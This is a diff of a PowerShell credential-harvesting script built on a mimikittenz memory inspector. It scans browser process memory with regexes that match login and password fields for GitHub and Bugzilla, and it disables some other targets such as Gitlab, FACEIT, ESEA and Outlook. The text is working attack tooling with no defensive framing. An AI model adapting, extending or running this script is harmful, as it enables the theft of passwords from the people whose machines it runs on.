@@ -457,7 +457,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 # Desktop Email
 	
     # Outlook
-    [mimikittenz.MemProcInspector]::AddRegex("Outlook","Authorization: Basic .{1,100}")
+    #[mimikittenz.MemProcInspector]::AddRegex("Outlook","Authorization: Basic .{1,100}")
 
 
 #Web Services
@@ -545,7 +545,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     #Github
     [mimikittenz.MemProcInspector]::AddRegex("Github","%3D%3D&login=.{1,50}&password=.{1,50}")
     #Gitlab?
-    [mimikittenz.MemProcInspector]::AddRegex("Gitlab","%3D%3D&login=.{1,50}&password=.{1,50}")
+    #[mimikittenz.MemProcInspector]::AddRegex("Gitlab","%3D%3D&login=.{1,50}&password=.{1,50}")
     #Bugzilla
     [mimikittenz.MemProcInspector]::AddRegex("BugZilla","Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}")
     #Zendesk
@@ -563,11 +563,11 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 #Gaming Related Apps
 
     #Faceit Web
-    [mimikittenz.MemProcInspector]::AddRegex("FACEIT.com","&email=.{1,99}?&password=.{1,99}")
+    #[mimikittenz.MemProcInspector]::AddRegex("FACEIT.com","&email=.{1,99}?&password=.{1,99}")
     #Faceit Anti-Cheat
     #[mimikittenz.MemProcInspector]::AddRegex("FACEIT Client","<regex_here>")
     #ESEA Web
-    [mimikittenz.MemProcInspector]::AddRegex("PLAY.ESEA.net","alias=.{1,50}&password=.{1,50}")
+    #[mimikittenz.MemProcInspector]::AddRegex("PLAY.ESEA.net","alias=.{1,50}&password=.{1,50}")
     #ESEA Client
     #[mimikittenz.MemProcInspector]::AddRegex("ESEA Client","<regex_here>")
     #Plays.tv Video Recorder
@@ -577,6 +577,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     #Hitbox.TV
     #[mimikittenz.MemProcInspector]::AddRegex("Hitbox.tv","<regex_here>")
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
-$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox","opera","outlook","faceitclient","eseaclient","playstv")
+$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
+#opera","outlook","faceitclient","eseaclient","playstv
 write-output $matchesFound
 }
